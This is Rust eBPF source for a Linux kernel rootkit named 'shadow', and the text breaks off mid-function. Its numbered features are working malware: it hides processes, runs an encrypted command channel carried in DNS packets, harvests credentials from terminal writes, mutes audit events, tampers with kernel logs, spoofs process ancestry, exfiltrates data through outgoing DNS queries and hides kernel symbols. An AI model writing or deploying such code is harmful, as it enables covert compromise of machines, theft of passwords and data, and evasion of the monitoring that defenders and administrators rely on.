#![no_std]
#![no_main]

use aya_ebpf::{
    bindings::xdp_action,
    helpers::{
        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_read_user,
        bpf_probe_write_user,
    },
    macros::{kprobe, kretprobe, map, xdp},
    maps::{HashMap, PerCpuArray, PerfEventArray},
    programs::{ProbeContext, RetProbeContext, XdpContext},
};
use common::{
    CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, RootkitConfig, TimestompEntry,
    C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
    EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN,
    EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
    MAGIC_BYTES,
};
use core::mem;

// ──────────────────────────────────────────────
// Kernel Struct Offsets
// Target: Linux 6.1+ (x86_64). Derived from pahole/BTF.
// These WILL break on other kernel versions without CO-RE/BTF relocation.
// ──────────────────────────────────────────────

const FILE_F_INODE_OFFSET: u64 = 32; // struct file → f_inode
const INODE_I_INO_OFFSET: u64 = 64; // struct inode → i_ino
const PATH_DENTRY_OFFSET: u64 = 8; // struct path → dentry
const DENTRY_D_INODE_OFFSET: u64 = 48; // struct dentry → d_inode
const KSTAT_ATIME_OFFSET: u64 = 72; // struct kstat → atime (timespec64)
const KSTAT_MTIME_OFFSET: u64 = 88; // struct kstat → mtime
const KSTAT_CTIME_OFFSET: u64 = 104; // struct kstat → ctime

// ──────────────────────────────────────────────
// BPF Maps
// ──────────────────────────────────────────────

/// Stores PIDs to hide. Key: PID (u32), Value: 1 (u8, dummy marker).
#[map]
static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

/// Rootkit configuration. Key: 0 (u32, singleton). Value: RootkitConfig.
#[map]
static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

/// Events sent to user-space loader.
#[map]
static EVENTS: PerfEventArray<EventHeader> = PerfEventArray::new(0);

/// Temporary storage for getdents64 return buffer pointer.
/// Key: tgid (u64). Value: buffer pointer (u64).
#[map]
static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

/// Temporary storage for getdents64 return value (bytes read).
/// Key: tgid (u64). Value: bytes_read (i64).
#[map]
static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1024, 0);

/// TTY file descriptors to monitor for credential harvesting.
/// Key: major:minor device number (u64). Value: 1 (marker).
#[map]
static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);

/// Credential capture events sent to user-space.
#[map]
static CRED_EVENTS: PerfEventArray<CredentialCapture> = PerfEventArray::new(0);

/// PIDs whose parent PID should be spoofed.
/// Key: PID (u32). Value: fake PPID (u32).
#[map]
static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

/// DNS exfiltration queue. User-space writes chunks, TC program reads them.
/// Key: sequence number (u32). Value: DnsExfilChunk.
#[map]
static DNS_EXFIL_QUEUE: HashMap<u32, DnsExfilChunk> = HashMap::with_max_entries(64, 0);

/// Shadow program IDs to protect from detachment.
/// Key: BPF program ID (u32). Value: 1 (marker).
#[map]
static PROTECTED_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

/// Inodes whose timestamps should be faked.
/// Key: inode number (u64). Value: TimestompEntry.
#[map]
static TIMESTOMP_INODES: HashMap<u64, TimestompEntry> = HashMap::with_max_entries(64, 0);

/// Patterns to suppress in kernel log output (hashes of strings to hide).
/// Key: hash of pattern (u64). Value: 1 (marker).
#[map]
static LOG_SUPPRESS_PATTERNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

/// Map of file descriptors to obfuscate.
/// Key: inode number (u64). Value: 1 (file obfuscation) or 2 (kallsyms hiding).
#[map]
static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

/// Unified vfs_read context for kretprobe dispatch (Features 3, 8, 10).
/// Stored on kprobe entry, consumed by the appropriate kretprobe.
/// Key: pid_tgid (u64). Value: VfsReadCtx.
#[derive(Clone, Copy)]
#[repr(C)]
struct VfsReadCtx {
    buf_ptr: u64,
    inode: u64,
    count: u64,
}

#[map]
static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);

/// Per-CPU scratch buffer for data scanning (avoids exceeding BPF 512-byte stack limit).
#[repr(C)]
struct ScratchBuf {
    data: [u8; 4096],
}

#[map]
static SCRATCH_BUF: PerCpuArray<ScratchBuf> = PerCpuArray::with_max_entries(1, 0);

/// Temporary storage for do_syslog kprobe → kretprobe handoff.
/// Key: pid_tgid (u64). Value: SyslogCtx { syslog_type, buf_ptr, len }.
#[derive(Clone, Copy)]
#[repr(C)]
struct SyslogCtx {
    syslog_type: u32,
    _pad: u32,
    buf_ptr: u64,
    len: u64,
}

#[map]
static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);

/// Temporary storage for vfs_getattr kprobe → kretprobe handoff.
/// Key: pid_tgid (u64). Value: GetattrCtx { kstat_ptr, inode }.
#[derive(Clone, Copy)]
#[repr(C)]
struct GetattrCtx {
    kstat_ptr: u64,
    inode: u64,
}

#[map]
static GETATTR_ARGS: HashMap<u64, GetattrCtx> = HashMap::with_max_entries(256, 0);

/// Temporary storage for audit context pointer.
/// Key: tgid (u64). Value: audit_context pointer (u64).
#[map]
static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

/// Current sequence number to send. Atomically incremented after each send.
/// Key: 0 (singleton). Value: next seq number to transmit (u32).
#[map]
static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// FEATURE 1: Process Hiding (getdents64)
// ──────────────────────────────────────────────

/// Kernel entry: capture buffer pointer argument.
#[kprobe]
pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
    try_getdents64_enter(&ctx).unwrap_or_default()
}

fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    let buf_ptr: u64 = ctx.arg(1).ok_or(1i64)?;
    let tgid = bpf_get_current_pid_tgid();
    GETDENTS_BUFS.insert(&tgid, &buf_ptr, 0).map_err(|_| 2i64)?;
    Ok(0)
}

/// Kernel return: iterate entries and hide matching PIDs.
#[kretprobe]
pub fn shadow_getdents64_exit(ctx: RetProbeContext) -> u32 {
    try_getdents64_exit(&ctx).unwrap_or_default()
}

fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let tgid = bpf_get_current_pid_tgid();
    let buf_ptr = unsafe { GETDENTS_BUFS.get(&tgid).ok_or(1i64)? };
    let buf_ptr = *buf_ptr;
    let _ = GETDENTS_BUFS.remove(&tgid);

    let ret_val: i64 = ctx.ret().ok_or(2i64)?;
    if ret_val <= 0 {
        return Ok(0);
    }
    let total_bytes = ret_val as u64;

    let _probe_byte = match unsafe { bpf_probe_read_user(buf_ptr as *const u8) } {
        Ok(v) => v,
        Err(_) => return Ok(0),
    };

    let mut offset: u64 = 0;
    let mut prev_reclen_ptr: u64 = 0;
    let mut prev_reclen_val: u16 = 0;

    for _i in 0..128u32 {
        if offset >= total_bytes {
            break;
        }

        let entry_ptr = buf_ptr + offset;
        let reclen_ptr = entry_ptr + 16;
        let d_reclen: u16 = match unsafe { bpf_probe_read_user(reclen_ptr as *const u16) } {
            Ok(v) => v,
            Err(_) => break,
        };

        if d_reclen == 0 {
            break;
        }

        let name_ptr = entry_ptr + 19;
        let d_name: [u8; 16] = match unsafe { bpf_probe_read_user(name_ptr as *const [u8; 16]) } {
            Ok(v) => v,
            Err(_) => {
                offset += d_reclen as u64;
                continue;
            }
        };

        let pid = parse_pid_from_name(&d_name);

        if pid > 0 && unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
            if prev_reclen_ptr != 0 {
                let new_reclen = prev_reclen_val + d_reclen;
                unsafe {
                    let _ = bpf_probe_write_user(
                        prev_reclen_ptr as *mut u16,
                        &new_reclen as *const u16,
                    );
                }
                prev_reclen_val = new_reclen;
            } else {
                let dot_name: [u8; 2] = [b'.', 0];
                unsafe {
                    let _ = bpf_probe_write_user(
                        (entry_ptr + 19) as *mut [u8; 2],
                        &dot_name as *const [u8; 2],
                    );
                }
                prev_reclen_ptr = reclen_ptr;
                prev_reclen_val = d_reclen;
            }
            offset += d_reclen as u64;
            continue;
        }

        prev_reclen_ptr = reclen_ptr;
        prev_reclen_val = d_reclen;
        offset += d_reclen as u64;
    }

    Ok(0)
}

#[inline(always)]
fn parse_pid_from_name(name: &[u8; 16]) -> u32 {
    let mut pid: u32 = 0;
    let mut i = 0usize;
    while i < 16 {
        let c = name[i];
        if c == 0 {
            break;
        }
        if !(b'0'..=b'9').contains(&c) {
            return 0;
        }
        pid = pid * 10 + (c - b'0') as u32;
        i += 1;
    }
    pid
}

// ──────────────────────────────────────────────
// FEATURE 2: Network Stealth (XDP)
// ──────────────────────────────────────────────

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const ETH_P_IP: u16 = 0x0800;
const IPPROTO_UDP: u8 = 17;

#[xdp]
pub fn shadow_xdp(ctx: XdpContext) -> u32 {
    match try_shadow_xdp(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_shadow_xdp(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    let encrypted_min_len = ETH_HDR_LEN
        + IP_HDR_LEN
        + UDP_HDR_LEN
        + 4
        + CHACHA20_NONCE_LEN
        + mem::size_of::<CommandPayload>()
        + 16;
    let legacy_min_len =
        ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 + mem::size_of::<CommandPayload>() + 16;
    if data + legacy_min_len > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let eth_proto = unsafe {
        let ptr = data as *const u8;
        u16::from_be(*(ptr.add(12) as *const u16))
    };
    if eth_proto != ETH_P_IP {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe { *(ip_start as *const u8).add(9) };
    if ip_proto != IPPROTO_UDP {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_start as *const u8).add(2) as *const u16)) };

    if dst_port != 53 {
        return Ok(xdp_action::XDP_PASS);
    }

    let payload_start = udp_start + UDP_HDR_LEN;
    let magic = unsafe {
        let ptr = payload_start as *const [u8; 4];
        *ptr
    };

    if magic != MAGIC_BYTES {
        return Ok(xdp_action::XDP_PASS);
    }

    let is_encrypted = data + encrypted_min_len <= data_end;

    let cmd = if is_encrypted {
        let nonce_start = payload_start + 4;
        let nonce: [u8; 12] = unsafe {
            let ptr = nonce_start as *const [u8; 12];
            *ptr
        };

        let enc_payload_start = nonce_start + CHACHA20_NONCE_LEN;
        let mac_start = enc_payload_start + mem::size_of::<CommandPayload>();

        let received_mac = unsafe {
            let ptr = mac_start as *const [u8; 16];
            *ptr
        };
        let computed_mac = compute_c2_hmac(
            payload_start as *const u8,
            4 + CHACHA20_NONCE_LEN + mem::size_of::<CommandPayload>(),
        );
        if received_mac != computed_mac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 1,
            };
            EVENTS.output(ctx, &event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        let keystream = chacha8_block(&C2_CHACHA20_KEY, &nonce, 0);

        let mut enc_bytes: [u8; 16] = [0u8; 16];
        unsafe {
            let src = enc_payload_start as *const u8;
            let mut i = 0usize;
            while i < 16 {
                enc_bytes[i] = *src.add(i);
                i += 1;
            }
        }

        let mut dec_bytes: [u8; 16] = [0u8; 16];
        let mut i = 0usize;
        while i < 16 {
            dec_bytes[i] = enc_bytes[i] ^ keystream[i];
            i += 1;
        }

        unsafe { *(dec_bytes.as_ptr() as *const CommandPayload) }
    } else {
        let hmac_start = payload_start + 4 + mem::size_of::<CommandPayload>();
        let received_hmac = unsafe {
            let ptr = hmac_start as *const [u8; 16];
            *ptr
        };
        let computed_hmac = compute_c2_hmac(
            payload_start as *const u8,
            4 + mem::size_of::<CommandPayload>() as usize,
        );
        if received_hmac != computed_hmac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 0,
            };
            EVENTS.output(ctx, &event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        unsafe {
            let cmd_ptr = (payload_start + 4) as *const CommandPayload;
            *cmd_ptr
        }
    };

    match cmd.cmd_type {
        1 => {
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.insert(&pid, &1u8, 0);
        }
        2 => {
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.remove(&pid);
        }
        3 => {
            let inode = cmd.arg1 as u64;
            let _ = OBFUSCATE_INODES.insert(&inode, &1u8, 0);
        }
        5 => {}
        _ => {}
    }

    let event = EventHeader {
        event_type: EVENT_PACKET_INTERCEPTED,
        pid: cmd.cmd_type,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cmd.arg1 as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(xdp_action::XDP_DROP)
}

#[inline(always)]
fn compute_c2_hmac(data: *const u8, len: usize) -> [u8; 16] {
    let mut mac = common::C2_HMAC_KEY;
    let max_len = if len > 64 { 64 } else { len };
    for i in 0..64usize {
        if i >= max_len {
            break;
        }
        let byte = unsafe { *data.add(i) };
        mac[i % 16] ^= byte;
        mac[i % 16] = mac[i % 16].wrapping_add(byte).rotate_left(3);
    }
    mac
}

// ──────────────────────────────────────────────
// FEATURE 3: File Obfuscation (vfs_read)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_vfs_read(ctx: ProbeContext) -> u32 {
    try_shadow_vfs_read(&ctx).unwrap_or_default()
}

fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
    let file_ptr: u64 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    let f_inode_ptr: u64 =
        match unsafe { bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return Ok(0),
        };

    if f_inode_ptr == 0 {
        return Ok(0);
    }

    let i_ino: u64 =
        match unsafe { bpf_probe_read_kernel((f_inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
            Ok(v) => v,
            Err(_) => return Ok(0),
        };

    let marker = unsafe { OBFUSCATE_INODES.get(&i_ino) };
    if marker.is_none() {
        let pid_tgid = bpf_get_current_pid_tgid();
        let _ = VFS_READ_ARGS.insert(
            &pid_tgid,
            &VfsReadCtx {
                buf_ptr,
                inode: i_ino,
                count,
            },
            0,
        );
        return Ok(0);
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let _ = VFS_READ_ARGS.insert(
        &pid_tgid,
        &VfsReadCtx {
            buf_ptr,
            inode: i_ino,
            count,
        },
        0,
    );

    let marker_val = *marker.unwrap();

    if marker_val == 2 {
        return Ok(0);
    }

    let zero_len = if count > 256 { 256u32 } else { count as u32 };
    let zeros: [u8; 256] = [0u8; 256];
    unsafe {
        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
            buf_ptr as *mut core::ffi::c_void,
            zeros.as_ptr() as *const core::ffi::c_void,
            zero_len,
        );
    }

    let event = EventHeader {
        event_type: EVENT_FILE_OBFUSCATED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: i_ino,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 4: Telemetry Muting
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
    try_mute_audit(&ctx).unwrap_or_default()
}

fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    let event = EventHeader {
        event_type: EVENT_TELEMETRY_MUTED,
        pid: tgid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 1,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

#[kprobe]
pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
    try_mute_audit_log_end(&ctx).unwrap_or_default()
}

fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
        return Ok(0);
    }

    let ab_ptr: u64 = _ctx.arg(0).ok_or(1i64)?;
    if ab_ptr == 0 {
        return Ok(0);
    }

    let skb_ptr: u64 = match unsafe { bpf_probe_read_kernel(ab_ptr as *const u64) } {
        Ok(v) => v,
        Err(_) => return Ok(0),
    };

    if skb_ptr == 0 {
        return Ok(0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 6: Credential Harvesting (sys_write on TTY)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_cred_harvest(ctx: ProbeContext) -> u32 {
    try_cred_harvest(&ctx).unwrap_or_default()
}

fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
    let fd: u32 = ctx.arg(0).ok_or(1i64)?;
    let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
    let count: u64 = ctx.arg(2).ok_or(3i64)?;

    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;

    if let Some(config) = unsafe { CONFIG.get(&0u32) } {
        if tgid == config.self_pid {
            return Ok(0);
        }
    }

    let fd_key = fd as u64;
    if unsafe { MONITORED_TTYS.get(&fd_key).is_none() } {
        return Ok(0);
    }

    let read_len = if count > 64 { 64u32 } else { count as u32 };
    let mut capture = CredentialCapture {
        pid: tgid,
        fd,
        data_len: read_len,
        _pad: 0,
        data: [0u8; 64],
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            capture.data.as_mut_ptr() as *mut core::ffi::c_void,
            read_len,
            buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    CRED_EVENTS.output(ctx, &capture, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 7: Log Tampering (do_syslog)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
    let syslog_type: u32 = match ctx.arg(0) {
        Some(v) => v,
        None => return 0,
    };
    if syslog_type != 2 && syslog_type != 3 {
        return 0;
    }
    let buf_ptr: u64 = match ctx.arg(1) {
        Some(v) => v,
        None => return 0,
    };
    let len: u64 = match ctx.arg(2) {
        Some(v) => v,
        None => return 0,
    };
    let pid_tgid = bpf_get_current_pid_tgid();
    let entry = SyslogCtx {
        syslog_type,
        _pad: 0,
        buf_ptr,
        len,
    };
    let _ = SYSLOG_ARGS.insert(&pid_tgid, &entry, 0);
    0
}

#[kretprobe]
pub fn shadow_tamper_logs(ctx: RetProbeContext) -> u32 {
    try_tamper_logs(&ctx).unwrap_or_default()
}

fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { SYSLOG_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };
    let _ = SYSLOG_ARGS.remove(&pid_tgid);

    if args.buf_ptr == 0 || args.len == 0 {
        return Ok(0);
    }

    let scan_len = if args.len > 2048 {
        2048usize
    } else {
        args.len as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let pattern: [u8; 7] = *b"shadow_";

    let mut i = 0usize;
    let max_scan = scan_len.saturating_sub(7);

    while i < max_scan {
        if i >= 2041 {
            break;
        }

        if buf.data[i] == pattern[0]
            && buf.data[i + 1] == pattern[1]
            && buf.data[i + 2] == pattern[2]
            && buf.data[i + 3] == pattern[3]
            && buf.data[i + 4] == pattern[4]
            && buf.data[i + 5] == pattern[5]
            && buf.data[i + 6] == pattern[6]
        {
            let mut line_start = i;
            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                line_start -= 1;
                if line_start == 0 {
                    break;
                }
            }

            let mut line_end = i + 7;
            while line_end < scan_len && buf.data[line_end] != b'\n' {
                line_end += 1;
                if line_end >= 2048 {
                    break;
                }
            }

            let mut j = line_start;
            while j < line_end && j < 2048 {
                buf.data[j] = b' ';
                j += 1;
            }

            let write_len = (line_end - line_start) as u32;
            if write_len > 0 && write_len < 2048 {
                unsafe {
                    let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                        (args.buf_ptr + line_start as u64) as *mut core::ffi::c_void,
                        buf.data[line_start..].as_ptr() as *const core::ffi::c_void,
                        write_len,
                    );
                }
            }

            i = line_end + 1;
        } else {
            i += 1;
        }
    }

    let event = EventHeader {
        event_type: EVENT_LOG_TAMPERED,
        pid: (pid_tgid >> 32) as u32,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: scan_len as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 8: Process Ancestry Spoofing
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_spoof_ancestry(ctx: RetProbeContext) -> u32 {
    try_spoof_ancestry(&ctx).unwrap_or_default()
}

fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    let scan_len = if args.count > 512 {
        512usize
    } else {
        args.count as usize
    };

    let buf = unsafe {
        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
        &mut *ptr
    };

    unsafe {
        if aya_ebpf::helpers::gen::bpf_probe_read_user(
            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
            scan_len as u32,
            args.buf_ptr as *const core::ffi::c_void,
        ) < 0
        {
            return Ok(0);
        }
    }

    let ppid_pattern: [u8; 6] = *b"PPid:\t";

    let max_scan = scan_len.saturating_sub(6);
    let mut ppid_offset: usize = 0;
    let mut found = false;

    let mut i = 0usize;
    while i < max_scan {
        if i >= 506 {
            break;
        }
        if buf.data[i] == ppid_pattern[0]
            && buf.data[i + 1] == ppid_pattern[1]
            && buf.data[i + 2] == ppid_pattern[2]
            && buf.data[i + 3] == ppid_pattern[3]
            && buf.data[i + 4] == ppid_pattern[4]
            && buf.data[i + 5] == ppid_pattern[5]
        {
            ppid_offset = i + 6;
            found = true;
            break;
        }
        i += 1;
    }

    if !found {
        return Ok(0);
    }

    let pid_pattern: [u8; 5] = *b"Pid:\t";
    let mut target_pid: u32 = 0;
    let mut j = 0usize;
    while j < max_scan {
        if j >= 507 {
            break;
        }
        if buf.data[j] == pid_pattern[0]
            && buf.data[j + 1] == pid_pattern[1]
            && buf.data[j + 2] == pid_pattern[2]
            && buf.data[j + 3] == pid_pattern[3]
            && buf.data[j + 4] == pid_pattern[4]
            && (j == 0 || buf.data[j - 1] == b'\n' || buf.data[j - 1] == b'\t')
        {
            let mut k = j + 5;
            while k < scan_len && k < 512 && buf.data[k] >= b'0' && buf.data[k] <= b'9' {
                target_pid = target_pid * 10 + (buf.data[k] - b'0') as u32;
                k += 1;
            }
            break;
        }
        j += 1;
    }

    if target_pid == 0 {
        return Ok(0);
    }

    let fake_ppid = match unsafe { SPOOFED_PPIDS.get(&target_pid) } {
        Some(ppid) => *ppid,
        None => return Ok(0),
    };

    let mut ppid_str: [u8; 10] = [b' '; 10];
    let mut ppid_val = fake_ppid;
    let mut digit_count = 0usize;

    let mut tmp = if ppid_val == 0 { 1u32 } else { ppid_val };
    while tmp > 0 {
        digit_count += 1;
        tmp /= 10;
    }

    let mut pos = digit_count;
    if ppid_val == 0 {
        ppid_str[0] = b'0';
    } else {
        while ppid_val > 0 && pos > 0 {
            pos -= 1;
            ppid_str[pos] = b'0' + (ppid_val % 10) as u8;
            ppid_val /= 10;
        }
    }

    let mut orig_len = 0usize;
    let mut m = ppid_offset;
    while m < scan_len && m < 512 && buf.data[m] >= b'0' && buf.data[m] <= b'9' {
        orig_len += 1;
        m += 1;
    }

    let write_len = if orig_len > digit_count {
        orig_len
    } else {
        digit_count
    };
    if write_len > 0 && write_len <= 10 && ppid_offset + write_len <= 512 {
        let mut overwrite: [u8; 10] = [b' '; 10];
        let mut n = 0usize;
        while n < digit_count && n < 10 {
            overwrite[n] = ppid_str[n];
            n += 1;
        }

        unsafe {
            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                (args.buf_ptr + ppid_offset as u64) as *mut core::ffi::c_void,
                overwrite.as_ptr() as *const core::ffi::c_void,
                write_len as u32,
            );
        }
    }

    let event = EventHeader {
        event_type: EVENT_ANCESTRY_SPOOFED,
        pid: target_pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: fake_ppid as u64,
    };
    EVENTS.output(_ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 9: DNS Exfiltration (TC egress)
// ──────────────────────────────────────────────

#[aya_ebpf::macros::classifier]
pub fn shadow_dns_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
    try_dns_exfil(&ctx).unwrap_or_default()
}

fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    let min_len = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12;
    if data + min_len > data_end {
        return Ok(0);
    }

    let eth_proto = unsafe { u16::from_be(*(((data) as *const u8).add(12) as *const u16)) };
    if eth_proto != ETH_P_IP {
        return Ok(0);
    }

    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe { *(ip_start as *const u8).add(9) };
    if ip_proto != IPPROTO_UDP {
        return Ok(0);
    }

    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_start as *const u8).add(2) as *const u16)) };
    if dst_port != 53 {
        return Ok(0);
    }

    let seq = match unsafe { DNS_EXFIL_SEQ.get(&0u32) } {
        Some(s) => *s,
        None => return Ok(0),
    };

    let chunk = match unsafe { DNS_EXFIL_QUEUE.get(&seq) } {
        Some(c) => *c,
        None => return Ok(0),
    };

    let raw_len = if chunk.data_len > 31 {
        31u32
    } else {
        chunk.data_len
    };
    let hex_label_len = raw_len * 2;

    let insert_len = 1 + hex_label_len as usize;

    let dns_start = udp_start + UDP_HDR_LEN;
    let qname_start = dns_start + 12;

    if qname_start + insert_len + 1 > data_end {
        return Ok(0);
    }

    let hex_chars: [u8; 16] = *b"0123456789abcdef";

    let label_len_byte = [hex_label_len as u8];
    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            (qname_start - data) as u32,
            label_len_byte.as_ptr() as *const _,
            1,
            0,
        )
    };

    let write_offset = (qname_start + 1 - data) as u32;
    let mut hex_buf: [u8; 62] = [0u8; 62];
    let mut j = 0usize;
    while j < 31 {
        if j >= raw_len as usize {
            break;
        }
        let byte = chunk.data[j];
        hex_buf[j * 2] = hex_chars[(byte >> 4) as usize];
        hex_buf[j * 2 + 1] = hex_chars[(byte & 0x0f) as usize];
        j += 1;
    }

    let _ = unsafe {
        aya_ebpf::helpers::bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            write_offset,
            hex_buf.as_ptr() as *const _,
            hex_label_len,
            0,
        )
    };

    let next_seq = seq + 1;
    let _ = DNS_EXFIL_SEQ.insert(&0u32, &next_seq, 0);

    let _ = DNS_EXFIL_QUEUE.remove(&seq);

    let event = EventHeader {
        event_type: EVENT_DNS_EXFIL,
        pid: 0,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: seq as u64,
    };
    EVENTS.output(ctx, &event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_hide_kallsyms(ctx: RetProbeContext) -> u32 {
    try_hide_kallsyms(&ctx).unwrap_or_default()
}

fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();

    let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
        Some(a) => *a,
        None => return Ok(0),
    };

    if args.buf_ptr == 0 {
        return Ok(0);
    }

    let marker = match unsafe { OBFUSCATE_INODES.get(&args.inode) } {
        Some(m) => *m,
        None => return Ok(0),
    };
    if marker != 2 {
